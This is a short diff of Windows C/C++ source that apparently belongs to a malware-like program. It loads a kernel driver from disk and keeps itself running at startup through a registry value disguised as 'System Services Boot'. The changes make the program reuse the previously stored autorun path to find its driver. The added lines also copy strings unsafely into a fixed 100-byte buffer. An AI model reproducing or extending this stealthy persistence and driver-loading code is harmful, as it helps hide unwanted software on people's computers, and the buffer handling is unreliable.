@@ -14,6 +14,9 @@
 #pragma comment(lib,"WS2_32.lib")
 #define BUF_SIZE  512
 
+bool boot_auto = false;
+char _g_path[100];
+
 int _util_load_sysfile(char *theDriverName)
 {
 	char aPath[1024];
@@ -22,7 +25,12 @@ int _util_load_sysfile(char *theDriverName)
 	if(!sh) {
 		return false;
 	}
-	GetCurrentDirectory(512, aCurrentDirectory);
+	if (boot_auto) {
+		strcpy(aCurrentDirectory, _g_path);
+	} else {
+	    GetCurrentDirectory(512, aCurrentDirectory);
+	}
+	
 	_snprintf(aPath,
 			1022,
 			"%s\\%s.sys",
@@ -113,11 +121,10 @@ bool _startup() {
 	DWORD dwLen = sizeof(oPath);
     result = RegQueryValueEx(hKey, "System Services Boot", 0, &dwType, (LPBYTE)oPath, &dwLen);
 	if (result == ERROR_SUCCESS) {  // Already contains current file
-		if (strcmp(oPath, cPath) != 0) {  // Check if correct
-		    result = RegSetValueEx(hKey, "System Services Boot", 0, REG_SZ, (const unsigned char *)cPath, strlen(cPath));
-		} else {
-		    return true;
-		}
+		boot_auto = true;
+		strcpy(_g_path, oPath);
+		_g_path[strlen(_g_path) - 11] = 0;
+		return true;
 	} else {  // Set new value to this register item
 	    result = RegSetValueEx(hKey, "System Services Boot", 0, REG_SZ, (const unsigned char *)cPath, strlen(cPath));
 	}
